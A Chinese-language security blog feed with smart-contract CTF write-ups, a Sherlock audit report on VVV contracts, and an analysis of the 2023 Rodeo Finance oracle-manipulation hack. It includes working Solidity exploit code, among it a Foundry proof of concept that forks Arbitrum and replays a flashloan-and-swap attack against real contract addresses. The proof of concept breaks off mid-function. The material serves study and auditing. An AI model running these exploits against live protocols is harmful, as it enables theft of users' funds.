 level = IFactorial(target);</span><br><span class="line">        level.solve();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function factorial(uint256) public view returns (bytes32) &#123;</span><br><span class="line">        uint startGas = gasleft();</span><br><span class="line">        uint bal = address(0x100).balance;</span><br><span class="line">        uint usedGas = startGas - gasleft();</span><br><span class="line">        if (usedGas &lt; 1000) &#123;</span><br><span class="line">            bytes32 data01 = bytes32(uint256(1));</span><br><span class="line">            return data01;</span><br><span class="line">        &#125;</span><br><span class="line">        bytes32 data02 = bytes32(uint256(120));</span><br><span class="line">        return data02;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-BabyOtter</title>
      <link href="/2024/11/21/CTF-BabyOtter/"/>
      <url>/2024/11/21/CTF-BabyOtter/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-BabyOtter"><a href="#CTF-BabyOtter" class="headerlink" title="CTF-BabyOtter"></a>CTF-BabyOtter</h1><p>题目源代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract BabyOtter &#123;</span><br><span class="line">    bool public solved = false;</span><br><span class="line"></span><br><span class="line">    function solve(uint x) public &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            assert(x * 0x1337 == 1);</span><br><span class="line">        &#125;</span><br><span class="line">        solved = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题，有个unchecked</p><blockquote><p>它是一个不对溢出进行的一个检查unchecked 是一个特殊的关键字，表示在代码块中进行运算时不进行溢出检查。这意味着即使在某些情况下会发生溢出，也不会触发 Solidity 默认的溢出检查错误。</p></blockquote><p>那么就很容易想到溢出来解决这个题了<br>攻击代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">interface IBabyOtter &#123;</span><br><span class="line">    function solve(uint x) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exploit &#123;</span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        uint number = 106517423012574869748253447278778772725360170890836257832597187972312850502279;</span><br><span class="line">        address target = 0x4e309C767Acc9f9366d75C186454ed205d5Eeee3;</span><br><span class="line">        IBabyOtter(target).solve(number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-AdultOtter</title>
      <link href="/2024/11/21/CTF-AdultOtter/"/>
      <url>/2024/11/21/CTF-AdultOtter/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-AdultOtter"><a href="#CTF-AdultOtter" class="headerlink" title="CTF-AdultOtter"></a>CTF-AdultOtter</h1><p>题目源代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract AdultOtter &#123;</span><br><span class="line">    bool public solved = false;</span><br><span class="line"></span><br><span class="line">    function pwn(uint[16] memory code) public &#123;</span><br><span class="line">      uint[16] memory a;</span><br><span class="line">      uint[16] memory b;</span><br><span class="line"></span><br><span class="line">      for (uint i = 0; i &lt; 16; i++) &#123;</span><br><span class="line">        assert(1337 * i &lt; code[i] &amp;&amp; code[i] &lt; 1337 * (i + 1));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      for (uint i = 0; i &lt; 16; i++) &#123;</span><br><span class="line">        a[i] = i**i * code[i];</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      for (uint i = 1; i &lt; 16; i++) &#123;</span><br><span class="line">        b[i] = (2**255 + code[i] - 7 * a[i] + b[i-1]) % 2**64;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      assert(b[15] == 0);</span><br><span class="line">      solved = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是一道计算题，<br>其实就是使code[15] - 7 <em>i ** i * code[15] + code[14] - 7 <em>i</em></em> i * code[14] +  ……  code[1] - 7 *i ** i * code[1]+ b[0] 为2**64倍数即可。<br>答案：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">interface IAdultOtter &#123;</span><br><span class="line">    function pwn(uint[16] memory code) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exploit&#123;</span><br><span class="line"></span><br><span class="line">    function exploit() public  &#123;</span><br><span class="line">    address addr = 0x6D40aCf2EF8F8F99247666AEE922E79CB605DE3B;</span><br><span class="line">    uint[16] memory DataNumber;</span><br><span class="line">    DataNumber[0] = 11;</span><br><span class="line">    DataNumber[1] = 1513;</span><br><span class="line">    DataNumber[2] = 3859;</span><br><span class="line">    DataNumber[3] = 5192;</span><br><span class="line">    DataNumber[4] = 6112;</span><br><span class="line">    DataNumber[5] = 7966;</span><br><span class="line">    DataNumber[6] = 9263;</span><br><span class="line">    DataNumber[7] = 10432;</span><br><span class="line">    DataNumber[8] = 11709;</span><br><span class="line">    DataNumber[9] = 13320;</span><br><span class="line">    DataNumber[10] = 14564;</span><br><span class="line">    DataNumber[11] = 15480;</span><br><span class="line">    DataNumber[12] = 16614;</span><br><span class="line">    DataNumber[13] = 18200;</span><br><span class="line">    DataNumber[14] = 19485;</span><br><span class="line">    DataNumber[15] = 21344;</span><br><span class="line">    IAdultOtter(addr).pwn(DataNumber);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sherlock-2024-11-VVV审计报告</title>
      <link href="/2024/11/17/sherlock-2024-11-VVV%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/"/>
      <url>/2024/11/17/sherlock-2024-11-VVV%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="一"><a href="#一" class="headerlink" title="一"></a>一</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>If the admin records the investment using the investment token instead of the stablecoin, it will lead to an error.</p><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>Vulnerable code:</p><p>2024-11-vvv-exchange-update-HeYuan-33&#x2F;vvv-platform-smart-contracts&#x2F;contracts&#x2F;vc&#x2F;VVVVCInvestmentLedger.sol</p><p>Lines 268 to 277 in c1e47db</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (uint256 i = 0; i &lt; _kycAddresses.length; i++) &#123; </span><br><span class="line">    address kycAddress = _kycAddresses[i]; </span><br><span class="line">    uint256 investmentRound = _investmentRounds[i]; </span><br><span class="line">    uint256 amountToInvest = _amountsToInvest[i]; </span><br><span class="line">  </span><br><span class="line">    kycAddressInvestedPerRound[kycAddress][investmentRound] += amountToInvest; </span><br><span class="line">    totalInvestedPerRound[investmentRound] += amountToInvest; </span><br><span class="line">    emit VCInvestment(investmentRound, address(0), kycAddress, 0, 0, 0, amountToInvest); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>From the above, we can see that there is no validation for the investment amount, which can lead to issues such as the admin passing a non-stablecoin investment. This could result in errors, or if a zero investment amount is recorded, it could cause subsequent operations to fail or behave incorrectly.</p><h2 id="Internal-pre-conditions"><a href="#Internal-pre-conditions" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h2><p>When the admin calls the addInvestmentRecords function and passes the uint256[] calldata _amountsToInvest, it is an investment amount array that has not been validated.</p><h2 id="External-pre-conditions"><a href="#External-pre-conditions" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>This leads to the admin recording incorrect investments for the investor. As a result, when the investor later claims project tokens, they may receive an incorrect amount of tokens.</p><h2 id="Attack-Path"><a href="#Attack-Path" class="headerlink" title="Attack Path"></a>Attack Path</h2><p>No response</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>If the admin makes an incorrect investment record, and it is irreversible, it will lead to an irreversible error. Additionally, if a zero investment amount is recorded, it will also affect subsequent calculations.</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>I recommend adding a validation check for the uint256[] calldata _amountsToInvest when recording investment amounts,When passing parameters, add a token address to check whether it is a stablecoin.as shown below:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function addInvestmentRecords(</span><br><span class="line">    address[] calldata _kycAddresses,</span><br><span class="line">    uint256[] calldata _investmentRounds,</span><br><span class="line">    uint256[] calldata _amountsToInvest,</span><br><span class="line">    address _investmentTokenAddress  // New parameter for token address</span><br><span class="line">) external onlyAuthorized &#123;</span><br><span class="line"> for (uint256 i = 0; i &lt; _kycAddresses.length; i++) &#123;</span><br><span class="line">            address kycAddress = _kycAddresses[i];</span><br><span class="line">            uint256 investmentRound = _investmentRounds[i];</span><br><span class="line"></span><br><span class="line">            // Check if the investment amount is greater than zero</span><br><span class="line">             require(amountToInvest &gt; 0, &quot;Investment amount must be greater than zero&quot;);</span><br><span class="line"></span><br><span class="line">        // Check if the investment amount matches the expected token type</span><br><span class="line">        // Assuming the expected investment token is a stablecoin</span><br><span class="line">                address expectedToken = address(0xStableCoinAddress);</span><br><span class="line">               require( _investmentTokenAddress == expectedToken, &quot;Investment amount must be in the expected stablecoin type&quot;);</span><br><span class="line">               uint256 amountToInvest = _amountsToInvest[i];</span><br><span class="line"></span><br><span class="line">            kycAddressInvestedPerRound[kycAddress][investmentRound] += amountToInvest;</span><br><span class="line">            totalInvestedPerRound[investmentRound] += amountToInvest;</span><br><span class="line">            emit VCInvestment(investmentRound, address(0), kycAddress, 0, 0, 0, amountToInvest);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>I believe this is the best way to ensure the safety of investment records and prevent any potential errors from occurring.</p><h1 id="二"><a href="#二" class="headerlink" title="二"></a>二</h1><h2 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h2><p>Due to the lack of a minimum investment amount requirement, attackers can make a large number of malicious investments with a zero investment amount, consuming the investment round’s time and preventing other users from making legitimate investments.</p><h2 id="Root-Cause-1"><a href="#Root-Cause-1" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>Vulnerable Code</p><p>2024-11-vvv-exchange-update-HeYuan-33&#x2F;vvv-platform-smart-contracts&#x2F;contracts&#x2F;vc&#x2F;VVVVCInvestmentLedger.sol</p><p>Lines 143 to 156 in c1e47db</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (investmentIsPaused) revert InvestmentPaused(); </span><br><span class="line"> </span><br><span class="line">// check if signature is valid </span><br><span class="line">if (!_isSignatureValid(_params)) &#123; </span><br><span class="line">    revert InvalidSignature(); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">// check if the investment round is active </span><br><span class="line">if ( </span><br><span class="line">    block.timestamp &lt; _params.investmentRoundStartTimestamp || </span><br><span class="line">    block.timestamp &gt; _params.investmentRoundEndTimestamp </span><br><span class="line">) &#123; </span><br><span class="line">    revert InactiveInvestmentRound(); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>here is no check for the minimum investment amount here; The check only verifies if the basic requirements are met.</p><h2 id="Internal-pre-conditions-1"><a href="#Internal-pre-conditions-1" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h2><p>The investment meets some basic requirements, as follows:</p><p>if (investmentIsPaused) revert InvestmentPaused();</p><pre><code>    // check if signature is valid    if (!_isSignatureValid(_params)) &#123;        revert InvalidSignature();    &#125;    // check if the investment round is active    if (        block.timestamp &lt; _params.investmentRoundStartTimestamp ||        block.timestamp &gt; _params.investmentRoundEndTimestamp    ) &#123;        revert InactiveInvestmentRound();    &#125;</code></pre><p>This allows attackers to send a large number of zero-amount investments, causing other users’ investment requests to experience prolonged delays，Miss the investment round</p><h2 id="External-pre-conditions-1"><a href="#External-pre-conditions-1" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>No response</p><h2 id="Attack-Path-1"><a href="#Attack-Path-1" class="headerlink" title="Attack Path"></a>Attack Path</h2><p>The attacker first calls the invest function, sending a large number of zero-amount investment requests. The contract can only slowly process the attacker’s requests, consuming the time allocated for the investment round.</p><h2 id="Impact-1"><a href="#Impact-1" class="headerlink" title="Impact"></a>Impact</h2><p>Possible consequences:</p><p>DOS (Denial of Service) attack<br>High gas consumption<br>Excessive array iteration: Due to the length limitation of the investor address array, this can cause the administrator to take an excessive amount of time to add investment records.<br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  function addInvestmentRecords(</span><br><span class="line">        address[] calldata _kycAddresses,</span><br><span class="line">        uint256[] calldata _investmentRounds,</span><br><span class="line">        uint256[] calldata _amountsToInvest</span><br><span class="line">    ) external onlyAuthorized </span><br><span class="line">     //...</span><br><span class="line">        for (uint256 i = 0; i &lt; _kycAddresses.length; i++) &#123;</span><br><span class="line">            address kycAddress = _kycAddresses[i];</span><br><span class="line">            uint256 investmentRound = _investmentRounds[i];</span><br><span class="line">            uint256 amountToInvest = _amountsToInvest[i];</span><br><span class="line">//...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation-1"><a href="#Mitigation-1" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>You can take the following measures:</p><p>Set a minimum investment amount<br>Modify the investment address array to have a fixed length<br>Add a check to ensure the investment amount is not zero, as follows:<br>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (investmentIsPaused) revert InvestmentPaused();</span><br><span class="line"></span><br><span class="line">      // check if signature is valid</span><br><span class="line">      if (!_isSignatureValid(_params)) &#123;</span><br><span class="line">          revert InvalidSignature();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // check if the investment round is active</span><br><span class="line">      if (</span><br><span class="line">          block.timestamp &lt; _params.investmentRoundStartTimestamp ||</span><br><span class="line">          block.timestamp &gt; _params.investmentRoundEndTimestamp</span><br><span class="line">      ) &#123;</span><br><span class="line">          revert InactiveInvestmentRound();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">     //check if the _params.amountToInvest isn&#x27;t 0</span><br><span class="line">   if( </span><br><span class="line">       _params.amountToInvest == 0</span><br><span class="line">     )&#123;</span><br><span class="line">       revert()</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></p><h1 id="三"><a href="#三" class="headerlink" title="三"></a>三</h1><h2 id="Summary-2"><a href="#Summary-2" class="headerlink" title="Summary"></a>Summary</h2><p>During the process where the administrator adds multiple investment records to the contract, a condition was missed, which allowed bypassing the check for matching investment addresses and amounts, leading to the creation of incorrect investment records.</p><h2 id="Root-Cause-2"><a href="#Root-Cause-2" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>The vulnerability code is as follows:</p><p>2024-11-vvv-exchange-update-HeYuan-33&#x2F;vvv-platform-smart-contracts&#x2F;contracts&#x2F;vc&#x2F;VVVVCInvestmentLedger.sol</p><p>Lines 261 to 266 in c1e47db</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( </span><br><span class="line">    _kycAddresses.length != _investmentRounds.length || </span><br><span class="line">    _investmentRounds.length != _amountsToInvest.length </span><br><span class="line">) &#123; </span><br><span class="line">    revert ArrayLengthMismatch(); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>We can see that the if condition only checks if the lengths of the investment address array and the investment round array are equal, and compares the length of the investment amount array with the investment round array. It overlooks the comparison between the lengths of the investment address array and the investment amount array. This is a careless oversight.</p><h2 id="Internal-pre-conditions-2"><a href="#Internal-pre-conditions-2" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h2><p>No response</p><h2 id="External-pre-conditions-2"><a href="#External-pre-conditions-2" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>No response</p><h2 id="Attack-Path-2"><a href="#Attack-Path-2" class="headerlink" title="Attack Path"></a>Attack Path</h2><p>No response</p><h2 id="Impact-2"><a href="#Impact-2" class="headerlink" title="Impact"></a>Impact</h2><p>Due to the uncertainty about whether the lengths of the investment address array and the investment amount array are equal, this can lead to the administrator recording incorrect investment information, causing mismatched investment amounts and rounds for users. If an attacker exploits this vulnerability, they could enter an investment round as a low-investment participant and manipulate the number of investment addresses, resulting in a mismatch between the length of the investment amount array and the address array. This could cause the administrator to record a higher investment amount, leading to irreversible losses.</p><h2 id="PoC-2"><a href="#PoC-2" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation-2"><a href="#Mitigation-2" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Add a validation check to ensure that the lengths of the investment address array and the investment amount array are equal, as shown below:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (</span><br><span class="line">         _kycAddresses.length != _investmentRounds.length ||</span><br><span class="line">         _investmentRounds.length != _amountsToInvest.length ||</span><br><span class="line">            _kycAddresses.length !=_amountsToInvest.length</span><br><span class="line">        ) &#123;</span><br><span class="line">            revert ArrayLengthMismatch();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h1 id="虽然都被判为无效了。但是正确的有俩个漏洞时一是msg-sender的调用，二是抢跑攻击，只对nouce的检查，会让攻击者预先知道监听。让我们来看一下正确的报告："><a href="#虽然都被判为无效了。但是正确的有俩个漏洞时一是msg-sender的调用，二是抢跑攻击，只对nouce的检查，会让攻击者预先知道监听。让我们来看一下正确的报告：" class="headerlink" title="虽然都被判为无效了。但是正确的有俩个漏洞时一是msg.sender的调用，二是抢跑攻击，只对nouce的检查，会让攻击者预先知道监听。让我们来看一下正确的报告："></a>虽然都被判为无效了。但是正确的有俩个漏洞时一是msg.sender的调用，二是抢跑攻击，只对nouce的检查，会让攻击者预先知道监听。让我们来看一下正确的报告：</h1><h2 id="Token-Claim-Hijacking-Due-to-Missing-Validation"><a href="#Token-Claim-Hijacking-Due-to-Missing-Validation" class="headerlink" title="Token Claim Hijacking Due to Missing Validation"></a>Token Claim Hijacking Due to Missing Validation</h2><h2 id="Summary-3"><a href="#Summary-3" class="headerlink" title="Summary"></a>Summary</h2><p>The VVVVCTokenDistributor contract is vulnerable to a frontrunning attack due to missing validation of the msg.sender during the claim process. An attacker can exploit this by observing pending valid transactions and preemptively executing them with a higher gas price, thus claiming tokens intended for other users.</p><h2 id="Root-Cause-3"><a href="#Root-Cause-3" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>Lack of msg.sender Validation:</p><p>The claim function directly transfers tokens to msg.sender without checking if this address is the same as the kycAddress. This oversight allows any arbitrary address to execute the claim given access to a valid signature and calldata.</p><p><a href="https://github.com/sherlock-audit/2024-11-vvv-exchange-update/blob/1791f41b310489aaa66de349ef1b9e4bd331f14b/vvv-platform-smart-contracts/contracts/vc/VVVVCTokenDistributor.sol#L106C4-L136C10">https://github.com/sherlock-audit/2024-11-vvv-exchange-update/blob/1791f41b310489aaa66de349ef1b9e4bd331f14b/vvv-platform-smart-contracts/contracts/vc/VVVVCTokenDistributor.sol#L106C4-L136C10</a></p><pre><code>function claim(ClaimParams memory _params) public &#123;      if (claimIsPaused) &#123;          revert ClaimIsPaused();      &#125;      if (_params.projectTokenProxyWallets.length != _params.tokenAmountsToClaim.length) &#123;          revert ArrayLengthMismatch();      &#125;      if (_params.nonce &lt;= nonces[_params.kycAddress]) &#123;          revert InvalidNonce();      &#125;      if (!_isSignatureValid(_params)) &#123;          revert InvalidSignature();      &#125;      // update nonce      nonces[_params.kycAddress] = _params.nonce;      // define token to transfer      IERC20 projectToken = IERC20(_params.projectTokenAddress);      // transfer tokens from each wallet to the caller      for (uint256 i = 0; i &lt; _params.projectTokenProxyWallets.length; i++) &#123;          projectToken.safeTransferFrom(              _params.projectTokenProxyWallets[i],              msg.sender,              _params.tokenAmountsToClaim[i]          );      &#125;  </code></pre><h2 id="Internal-pre-conditions-3"><a href="#Internal-pre-conditions-3" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h2><p>none</p><h2 id="External-pre-conditions-3"><a href="#External-pre-conditions-3" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>none</p><h2 id="Attack-Path-3"><a href="#Attack-Path-3" class="headerlink" title="Attack Path"></a>Attack Path</h2><p>An attacker can exploit this vulnerability through the following steps:</p><p>Monitoring Transactions:</p><p>The attacker continuously monitors the Ethereum network for pending transactions targeting the VVVVCTokenDistributor contract, specifically those invoking the claim function.<br>Identifying Valid Claims:</p><p>The attacker identifies a pending transaction with valid ClaimParams and a correctly generated signature, submitted by a legitimate user intending to claim their tokens.<br>Replicating Transaction Data:</p><p>The attacker copies the calldata from the pending transaction. This calldata contains all necessary details, including the signature proving the claim’s validity.<br>Executing Frontrunning Attack:</p><p>The attacker creates a new transaction using the copied calldata, setting themselves as the msg.sender.<br>They submit this new transaction with a higher gas price, incentivizing miners to prioritize it over the original pending transaction.<br>Claiming Tokens:</p><p>Once mined, the attacker’s transaction executes before the original one, allowing them to receive the tokens intended for the legitimate claimant.</p><h2 id="Impact-3"><a href="#Impact-3" class="headerlink" title="Impact"></a>Impact</h2><p>The ability to front-run valid claims effectively nullifies the security guarantees provided by the cryptographic signature process, allowing attackers to exploit the system for illicit gain.</p><h2 id="PoC-3"><a href="#PoC-3" class="headerlink" title="PoC"></a>PoC</h2><p>Setup:</p><p>A legitimate user intends to execute a claim for tokens using the claim function, constructing valid ClaimParams with a correct signature.</p><p>Transaction Broadcast:</p><p>The user broadcasts their transaction on the Ethereum network, intending to receive tokens from specified proxy wallets into their own address.</p><p>Attacker Monitoring:</p><p>An attacker monitors pending transactions on the network, focusing on those interacting with the VVVVCTokenDistributor contract.</p><p>Data Replication:</p><p>Upon identifying the legitimate transaction, the attacker copies the calldata, including the ClaimParams and signature, retaining all necessary details.</p><p>Frontrunning Execution:</p><p>The attacker submits their own transaction using the duplicated calldata but specifies themselves as msg.sender.<br>The attacker sets a higher gas price to prioritize their transaction over the original.</p><p>Successful Claim Theft:</p><p>The attacker’s transaction gets mined before the original, claiming the tokens intended for the legitimate user.<br>The original user’s transaction fails due to the incremented nonce, rendering their claim invalid.</p><h2 id="Mitigation-3"><a href="#Mitigation-3" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Modify the claim function to include a check ensuring that msg.sender matches the kycAddress specified in the ClaimParams. This alignment verifies that the account executing the claim is the same account authorized to receive the tokens.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claim(ClaimParams memory _params) public &#123;  </span><br><span class="line">    require(msg.sender == _params.kycAddress, &quot;Sender not authorized to claim on behalf of KYC address&quot;);  </span><br><span class="line">    // ... existing claim logic ...  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 审计报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/11/17/RodeoFinance%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90/"/>
      <url>/2024/11/17/RodeoFinance%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>攻击介绍<br>2023年7月11日，Arbitrum链上的Rodeo Finance: Pool由于价格预言机操纵，而被黑客盗取了472 ETH。</p><p>攻击分析<br>攻击者利用了预言机的缺陷控制了unshETH与ETH之间的兑换比率,预言机使用 ETH 与 unshETH 的准备金比率来检查价格。同时攻击者能够通过具有未配置策略地址的 earn 函数强制平台将 USDC 兑换为 unshETH。由于价格预言机存在缺陷，滑点控制无法生效。(具体可见Meth为0x7b37c42b的交易)。</p><p>function earn(address usr, address pol, uint256 str, uint256 amt, uint256 bor, bytes calldata dat)<br>  external<br>  loop<br>  returns (uint256)<br>{<br>  if (status &lt; S_LIVE) revert WrongStatus();<br>  if (!pools[pol]) revert InvalidPool();<br>  if (strategies[str] &#x3D;&#x3D; address(0)) revert InvalidStrategy();<br>  uint256 id &#x3D; nextPosition++;<br>  Position storage p &#x3D; positions[id];<br>  p.owner &#x3D; usr;<br>  p.pool &#x3D; pol;<br>  p.strategy &#x3D; str;<br>  p.outset &#x3D; block.timestamp;<br>  pullTo(IERC20(IPool(p.pool).asset()), msg.sender, address(actor), uint256(amt));<br>  (int256 bas, int256 sha, int256 bar) &#x3D; actor.edit(id, int256(amt), int256(bor), dat);<br>  p.amount &#x3D; uint256(bas);<br>  p.shares &#x3D; uint256(sha);<br>  p.borrow &#x3D; uint256(bar);<br>  emit Edit(id, int256(amt), int256(bor), sha, bar);<br>  return id;<br>}<br>其次unshETH价格使用了TWAP，是计算45分钟内的最后4次更新价格实例的平均值，导致攻击者可以通过”三明治”来控制价格，从而套利。</p><p>function latestAnswer() external view returns (int256) {<br>  require(block.timestamp &lt; lastTimestamp + (updateInterval * 2), “stale price”);<br>  int256 price &#x3D; (prices[0] + prices[1] + prices[2] + prices[3]) &#x2F; 4;<br>  return price;<br>}<br>POC<br>&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED<br>pragma solidity ^0.8.10;</p><p>import “forge-std&#x2F;Test.sol”;<br>import “.&#x2F;interface.sol”;</p><p>&#x2F;&#x2F; Vulnerable Contract : 0xf3721d8a2c051643e06bf2646762522fa66100da<br>&#x2F;&#x2F; Attack Tx : 0xb1be5dee3852c818af742f5dd44def285b497ffc5c2eda0d893af542a09fb25a</p><p>interface IInvestor {<br>    function earn(<br>        address usr,<br>        address pol,<br>        uint256 str,<br>        uint256 amt,<br>        uint256 bor,<br>        bytes memory dat<br>    ) external returns (uint256);<br>}</p><p>interface ICamelotRouter {<br>    function swapExactTokensForTokensSupportingFeeOnTransferTokens(<br>        uint256 amountIn,<br>        uint256 amountOutMin,<br>        address[] memory path,<br>        address to,<br>        address referrer,<br>        uint256 deadline<br>    ) external;<br>}</p><p>interface ISwapRouter {<br>    struct ExactInputParams {<br>        bytes path;<br>        address recipient;<br>        uint256 deadline;<br>        uint256 amountIn;<br>        uint256 amountOutMinimum;<br>    }</p><pre><code>function exactInput(ExactInputParams memory params) external payable returns (uint256 amountOut);</code></pre><p>}</p><p>contract RodeoTest is Test {<br>    IERC20 unshETH &#x3D; IERC20(0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef);<br>    IERC20 WETH &#x3D; IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);<br>    IERC20 USDC &#x3D; IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);<br>    IInvestor Investor &#x3D; IInvestor(0x8accf43Dd31DfCd4919cc7d65912A475BfA60369);<br>    ICamelotRouter Router &#x3D; ICamelotRouter(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);<br>    ISwapRouter SwapRouter &#x3D; ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);<br>    IBalancerVault Vault &#x3D; IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);<br>    address private constant usdcPool &#x3D; 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE;<br>    CheatCodes cheats &#x3D; CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);</p><pre><code>function setUp() public &#123;    cheats.createSelectFork(&quot;arbitrum&quot;, 110_043_452);    cheats.label(address(unshETH), &quot;unsETH&quot;);    cheats.label(address(WETH), &quot;WETH&quot;);    cheats.label(address(USDC), &quot;USDC&quot;);    cheats.label(address(Investor), &quot;Investor&quot;);    cheats.label(address(Router), &quot;Router&quot;);    cheats.label(address(SwapRouter), &quot;SwapRouter&quot;);    cheats.label(address(Vault), &quot;Vault&quot;);&#125;function testExploit() public &#123;    deal(address(unshETH), address(this), 47_294_222_088_336_002_957);    unshETH.approve(address(Router), type(uint256).max);    WETH.approve(address(Router), type(uint256).max);    USDC.approve(address(SwapRouter), type(uint256).max);    Investor.earn(address(this), usdcPool, 41, 0, 400_000 * 1e6, abi.encode(500));       swapTokens(unshETH.balanceOf(address(this)), address(unshETH), address(WETH));    swapTokens(WETH.balanceOf(address(this)), address(WETH), address(USDC));    swapUSDCToWETH();    takeWETHFlashloanOnBalancer();&#125;function receiveFlashLoan(    address[] memory tokens,    uint256[] memory amounts,    uint256[] memory feeAmounts,    bytes memory userData) external &#123;        swapTokens(amounts[0], address(WETH), address(USDC));        swapUSDCToWETH();        WETH.transfer(address(Vault), amounts[0]);&#125;function swapTokens(uint256 amountIn, address fromToken, address toToken) internal &#123;    address[] memory path = new address[](2);    path[0] = fromToken;    path[1] = toToken;    Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(        amountIn, 0, path, address(this), address(0), block.timestamp + 100    );&#125;function swapUSDCToWETH() internal &#123;    bytes memory path = abi.encodePacked(address(USDC), uint24(500), address(WETH));    